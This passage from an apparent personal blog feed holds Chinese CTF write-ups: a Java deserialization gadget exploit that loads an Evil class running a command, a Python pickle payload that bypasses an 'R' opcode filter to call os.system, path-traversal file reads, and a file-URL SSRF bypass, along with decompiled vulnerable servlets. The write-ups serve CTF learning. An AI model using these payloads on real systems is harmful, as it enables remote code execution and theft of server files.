src="https://img-blog.csdnimg.cn/cdae5b45b0c54f2a9387cfed09139649.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>监听即可</p><p><img src="https://img-blog.csdnimg.cn/62e4b8fe0d9d4bb19b22fb6925e79cac.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>东华杯</title>
    <link href="/2021/11/04/2021-11-%E4%B8%9C%E5%8D%8E%E6%9D%AF/"/>
    <url>/2021/11/04/2021-11-%E4%B8%9C%E5%8D%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="EzGadget"><a href="#EzGadget" class="headerlink" title="EzGadget"></a>EzGadget</h1><p>这题在我调了几个cc库之后再看就很简单了，可以看另一篇文章。</p><p>找一个重写readobject和tostring得类就行了，这里找到<code>BadAttributeValueExpException</code>类，这个类可以调试几个cc链就明白能用来利用啥了，可参考另一篇文章，这里就是利用了<code>tostringbean</code>的defineclass可以读取任意字节代码，所以就只需要将<code>BadAttributeValueExpException</code>中val值设为ToStringBean类就行了</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>    ToStringBean toStringBean = <span class="hljs-keyword">new</span> ToStringBean();<br>    Class clazz = toStringBean.defineClass((String)<span class="hljs-keyword">null</span>, <span class="hljs-keyword">this</span>.ClassByte, <span class="hljs-number">0</span>, <span class="hljs-keyword">this</span>.ClassByte.length);<br>    Object var3 = <span class="hljs-keyword">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        var3 = clazz.newInstance();<br>    &#125; <span class="hljs-keyword">catch</span> (InstantiationException var5) &#123;<br>        var5.printStackTrace();<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var6) &#123;<br>        var6.printStackTrace();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;enjoy it.&quot;</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>exp如下</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.ToStringBean;<br><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.Tools;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exec</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            ToStringBean payload = <span class="hljs-keyword">new</span> ToStringBean();<br><br>            File clzFile = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;C:\\Users\\86130\\Desktop\\Evil.class&quot;</span>);<br><br>            <span class="hljs-keyword">byte</span>[] clzBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[(<span class="hljs-keyword">int</span>) clzFile.length()];<br><br>            FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(clzFile);<br>            fis.read(clzBytes); <span class="hljs-comment">//read file into bytes[]</span><br>            fis.close();<br><br>            payload.setClassByte(clzBytes);<br><br>            BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-string">&quot;placeholder&quot;</span>);<br>            Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>            field.setAccessible(<span class="hljs-keyword">true</span>);<br>            field.set(badAttributeValueExpException, payload);<br><br>            ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br><br>            ObjectOutputStream out = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br><br>            out.writeUTF(<span class="hljs-string">&quot;gadgets&quot;</span>);<br>            out.writeInt(<span class="hljs-number">2021</span>);<br>            <br>            <br>            <br>            <br>            <br>            out.writeObject(badAttributeValueExpException);<br><br>            <span class="hljs-comment">//String data = byteArrayOutputStream.toString();</span><br>            String data = Tools.base64Encode(byteArrayOutputStream.toByteArray());<br><br>            System.out.println(data);<br>            <span class="hljs-keyword">byte</span>[] b = Tools.base64Decode(data);<br>            InputStream inputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(b);<br>            ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(inputStream);<br>            String name = objectInputStream.readUTF();<br>            <span class="hljs-keyword">int</span> year = objectInputStream.readInt();<br>            <span class="hljs-keyword">if</span> (name.equals(<span class="hljs-string">&quot;gadgets&quot;</span>) &amp;&amp; year == <span class="hljs-number">2021</span>) &#123;<br>                objectInputStream.readObject();<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>Evil.java中写执行的命令就行了</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime r = Runtime.getRuntime();<br>            Process p = r.exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;);<br>            p.waitFor();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="Eznode"><a href="#Eznode" class="headerlink" title="Eznode"></a>Eznode</h1><p>第一步登录时注入，</p><p>要求查询结果与输入的用户密码相同，自输出，第五空间考过了一次</p><p>第二步时hcb模板渲染漏洞，参考<a href="https://xz.aliyun.com/t/4695">https://xz.aliyun.com/t/4695</a></p><h1 id="apacheproy"><a href="#apacheproy" class="headerlink" title="apacheproy"></a>apacheproy</h1><p>打现有的cve，比赛的时候没发现。weblogic的应用，版本12.2.1.3</p><p>参考<a href="https://www.jianshu.com/p/7d14e45a96e7">https://www.jianshu.com/p/7d14e45a96e7</a></p><h1 id="OldLibrary"><a href="#OldLibrary" class="headerlink" title="OldLibrary"></a>OldLibrary</h1><p>又是go题</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>长城杯</title>
    <link href="/2021/11/01/2021-10-%E9%95%BF%E5%9F%8E%E6%9D%AF/"/>
    <url>/2021/11/01/2021-10-%E9%95%BF%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h2><p>打开首页，看看源代码。</p><p><img src="http://81.70.81.64/wp-content/uploads/2021/09/%E5%9B%BE%E7%89%87-177.png" alt="img"></p><p>这里猜测就是可以读取源码，先读/self/proc/cmd可以发现源码时app.py，读取源码</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template,redirect,send_from_directory<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> send_file<br><br>app = Flask(__name__)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span>():</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,name,age</span>):</span><br>        self.name = name<br>        self.age = age<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        user = base64.b64decode(request.cookies.get(<span class="hljs-string">&#x27;user&#x27;</span>))<br>        <span class="hljs-keyword">if</span> check(user):<br>            user = pickle.loads(user)<br>            username = user[<span class="hljs-string">&quot;username&quot;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            username = <span class="hljs-string">&quot;bad,bad,hacker&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        username = <span class="hljs-string">&quot;CTFer&quot;</span><br>    pic = <span class="hljs-string">&#x27;&#123;0&#125;.jpg&#x27;</span>.<span class="hljs-built_in">format</span>(random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>))<br>    <br>    <span class="hljs-keyword">try</span>:<br>        pic=request.args.get(<span class="hljs-string">&#x27;pic&#x27;</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(pic, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            base64_data = base64.b64encode(f.read())<br>            p = base64_data.decode()<br>    <span class="hljs-keyword">except</span>:<br>        pic=<span class="hljs-string">&#x27;&#123;0&#125;.jpg&#x27;</span>.<span class="hljs-built_in">format</span>(random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">7</span>))<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(pic, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            base64_data = base64.b64encode(f.read())<br>            p = base64_data.decode()<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, uname=username, pic=p )<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">8888</span>)<br></code></pre></div></td></tr></table></figure><p>一看就是pickle，ban了R操作符，用o就行了</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">(S<span class="hljs-string">&#x27;whoami&#x27;</span><br>ios<br>system<br>.<span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure><h1 id="java-url"><a href="#java-url" class="headerlink" title="java_url"></a>java_url</h1><p>首页源代码中有一条注释，猜测可以目录穿越读文件。</p><p><img src="http://81.70.81.64/wp-content/uploads/2021/09/%E5%9B%BE%E7%89%87-173.png" alt="img"></p><p><code>filename=../</code>确定存在文件包含漏洞，<code>download?filename=../../../../../../../../../etc/passwd</code>可读，并且泄露tomcat的绝对路径<code>/usr/local/tomcat/webapps/ROOT/WEB-INF/</code>。</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>testurl<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.test2.aaa1.testURL<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>testurl<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/testURL<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>download<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>com.test2.aaa1.download<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>download<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/download<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>java支持协议：</p><ul><li>file</li><li>http</li><li>https</li><li>ftp</li><li>netdoc</li><li>gopher</li></ul><p>读文件</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/test2/aaa1/testURL.class<br> <br>filename=../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/test2/aaa1/download.class<br></code></pre></div></td></tr></table></figure><p>testURL.class中可以通过<code>/testURL?url=url:file:///flag</code>或者<code>/testURL?url=%00file:///flag</code>来进行绕过。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> com.test2.aaa1;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.ServletOutputStream;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">download</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">download</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        <span class="hljs-keyword">this</span>.doPost(request, response);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        String fileName = request.getParameter(<span class="hljs-string">&quot;filename&quot;</span>);<br>        <span class="hljs-keyword">if</span> (fileName.contains(<span class="hljs-string">&quot;environ&quot;</span>)) &#123;<br>            response.getWriter().write(<span class="hljs-string">&quot;false&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            fileName = <span class="hljs-keyword">new</span> String(fileName.getBytes(<span class="hljs-string">&quot;ISO8859-1&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;filename=&quot;</span> + fileName);<br>            <span class="hljs-keyword">if</span> (fileName != <span class="hljs-keyword">null</span> &amp;&amp; fileName.toLowerCase().contains(<span class="hljs-string">&quot;flag&quot;</span>)) &#123;<br>                request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;no no no &quot;</span>);<br>                request.getRequestDispatcher(<span class="hljs-string">&quot;/message2.jsp&quot;</span>).forward(request, response);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                String fileSaveRootPath = <span class="hljs-keyword">this</span>.getServletContext().getRealPath(<span class="hljs-string">&quot;/WEB-INF/upload&quot;</span>);<br>                String path = <span class="hljs-keyword">this</span>.findFileSavePathByFileName(fileName, fileSaveRootPath);<br>                File file = <span class="hljs-keyword">new</span> File(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>                <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>                    request.setAttribute(<span class="hljs-string">&quot;message&quot;</span>, <span class="hljs-string">&quot;error&quot;</span>);<br>                    request.getRequestDispatcher(<span class="hljs-string">&quot;/message2.jsp&quot;</span>).forward(request, response);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    String realname = fileName.substring(fileName.indexOf(<span class="hljs-string">&quot;_&quot;</span>) + <span class="hljs-number">1</span>);<br>                    response.setHeader(<span class="hljs-string">&quot;content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + URLEncoder.encode(realname, <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>                    FileInputStream in = <span class="hljs-keyword">new</span> FileInputStream(path + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>                    ServletOutputStream out = response.getOutputStream();<br>                    <span class="hljs-keyword">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];<br>                    <span class="hljs-keyword">boolean</span> var11 = <span class="hljs-keyword">false</span>;<br><br>                    <span class="hljs-keyword">int</span> len;<br>                    <span class="hljs-keyword">while</span>((len = in.read(buffer)) &gt; <span class="hljs-number">0</span>) &#123;<br>                        out.write(buffer, <span class="hljs-number">0</span>, len);<br>                    &#125;<br><br>                    in.close();<br>                    out.close();<br>                &#125;<br>            &#125;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">findFileSavePathByFileName</span><span class="hljs-params">(String filename, String saveRootPath)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> hashCode = filename.hashCode();<br>        <span class="hljs-keyword">int</span> dir1 = hashCode &amp; <span class="hljs-number">15</span>;<br>        <span class="hljs-keyword">int</span> dir2 = (hashCode &amp; <span class="hljs-number">240</span>) &gt;&gt; <span class="hljs-number">4</span>;<br>        String dir = saveRootPath + <span class="hljs-string">&quot;/&quot;</span> + dir1 + <span class="hljs-string">&quot;/&quot;</span> + dir2;<br>        File file = <span class="hljs-keyword">new</span> File(dir);<br>        <span class="hljs-keyword">if</span> (!file.exists()) &#123;<br>            file.mkdirs();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> dir;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>testURL.class</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">package</span> com.test2.aaa1;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLConnection;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">testURL</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">testURL</span><span class="hljs-params">()</span> </span>&#123;<br>    